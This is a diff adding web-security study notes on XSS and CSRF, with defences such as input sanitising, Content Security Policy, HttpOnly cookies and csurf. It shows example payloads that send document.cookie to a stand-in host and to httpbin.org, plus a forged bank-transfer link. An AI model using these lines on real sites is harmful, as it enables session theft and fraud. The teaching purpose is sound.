@@ -472,5 +472,37 @@
     - advanced console log
   - [morgan](https://github.com/expressjs/morgan)
     - monitor api request
+- HTTPS Everywhere - SSL/TLS Certificates
+  - [Let's Encrypt](https://letsencrypt.org)
+  - [Cloudflare](https://www.cloudflare.com/)
+- [XSS](https://www.hacksplaining.com/exercises/xss-stored) & [CSRF](https://www.hacksplaining.com/exercises/csrf)
+  - XSS: Cross Side Scripting (use for session hijack)
+    - [Cross-site scripting for dummies](https://medium.com/hackernoon/cross-site-scripting-for-dummies-be30f76fad09)
+    - Hacker inject malicious code into blog post
+    - Malicious Code is run when user visit the blog post
+    - Example: ```window.location = 'www.zzz.com?cookie=' + document.cookie```
+    - Send user cookie to to malicious website www.zzz.com
+  - CSRF: Cross Site Request Forgery
+    - Client <-> Server <-> Database
+    - Client <-> 3rd Party API
+    - Users log in to their netbank.com
+    - Send them a malicious with the following code in the link
+    - Example: ```<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=$100">Read more!</a>```
+    - Users click the link and send AttackerA $100
+    - Example 2:
+    - ```fetch('//httpbin.org/post',{method:'POST',body:document.cookie})```
+    - Send cookie of the current login website to a malicious site
+    - [httpbin.org](https://httpbin.org)
+    - Solution: Block in document's Content Security Policy
+  - Summary
+    - Sanitize input
+    - No eval()
+    - No document.write() 
+      - Example: ```document.write('<script>alert(1)</script>')```
+    - [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+    - Secure + HTTPOnly [Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
+      - Secure: Cookies send over https
+      - HTTPOnly: Prevents cookies from being accessed by client side scripting
+    - [csurf](https://github.com/expressjs/csurf)
 
-  **[⬆ back to top](#table-of-contents)**
+**[⬆ back to top](#table-of-contents)**
